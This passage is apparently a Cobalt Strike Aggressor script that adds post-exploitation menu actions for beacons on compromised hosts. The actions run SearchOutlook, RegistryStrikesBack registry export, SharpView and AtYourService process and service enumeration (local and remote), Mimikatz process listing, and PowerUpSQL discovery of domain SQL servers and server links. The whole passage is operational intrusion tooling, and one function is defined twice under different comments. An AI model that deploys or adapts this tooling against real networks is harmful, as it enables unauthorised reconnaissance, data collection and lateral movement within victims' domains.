bexecute_assembly($bids, script_resource("/exe/SearchOutlook.exe"), "$1");
}, $bids => $1));
}

#################################################

#   Registry Strikes Back

#################################################

sub regsb{
    $bid = $1;
    $dialog = dialog("Registry Strikes Back", %(key => "", path => "", execmethod => "Execute-Assembly"), lambda({
       $cmdargs = "";
		$cmdargs = "$3['key'] $3['path']";
        if ($3["execmethod"] eq "Execute-Assembly"){         
            bexecute_assembly($bid, script_resource('/exe/RegistryStrikesBack.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Export Registry Keys");
    drow_text($dialog, "key",  "Please Enter A Registry Key: ");
    drow_text($dialog, "path",  "Please Enter A File Output Path: ");
    dbutton_action($dialog, "Run");
	dialog_show($dialog);
}

		
#################################################

#   EDR Query

#################################################


#################################################

#   Process Listing

#################################################
#Mimikatz List Process
sub mimilistprocesses{
bmimikatz($1, "process::list");
}

# SharpView Get-WMIProcesses
sub getwmiprocesses{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-WMIProcess");
}

# SharpView Get-WMIProcesses Remote
sub getremotewmiprocesses{
prompt_text("Remote Machine - (FQDN)", "", lambda({
bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-WMIProcess -ComputerName $1");
}, $bids => $1));
}

#################################################
##
##   Service Enumeration Functions
##
#################################################

sub serviceenumerationlocalhost{
bexecute_assembly($1, script_resource('/exe/AtYourService.exe'));
}

# View Remote Services
sub getremoteservices{
prompt_text("Remote Machine - (FQDN)", "", lambda({
bexecute_assembly($bids, script_resource('/exe/AtYourService.exe'), "$1");
}, $bids => $1));
}



#################################################

#   PowerUpSQL

#################################################
#PowerUpSQL Initialize			
sub psqlinit{
bpowershell_import($1, script_resource("/scripts/subscripts/powerupsql/PowerUpSQL.ps1"));
}

#PowerUpSQL Discover Local SQL Server			
sub psqldiscloc{
bpowerpick($1, "Get-SQLInstanceLocal -Verbose");
}

#PowerUpSQL Discover Domain SQL Servers
sub psqldiscdom{
bpowerpick($1, "Get-SQLInstanceDomain");
}


#PowerUpSQL Discover Domain SQL Servers Information		
sub psqldiscdominfo{
bpowerpick($1, "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose");
}

#PowerUpSQL Discover Domain SQL Servers - Check Availability
sub psqldiscdomcheck{
bpowerpick($1, "Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose");
}

#PowerUpSQL Find Links To Remote Servers	
sub psqlfindrem{
prompt_text("Server Instance", "", lambda({
bpowerpick($bids, "Get-SQLServerLink -Instance $1 -Verbose");
}, $bids => $1));
}

#PowerUpSQL Enumerate Database Links		
sub psqlfindrem{
prompt_text("Server Instance", "", lambda({
bpowerpick($bids, "Get-SQLServerLink -Instance $1 -Verbose");
}, $bids => $1));
}		
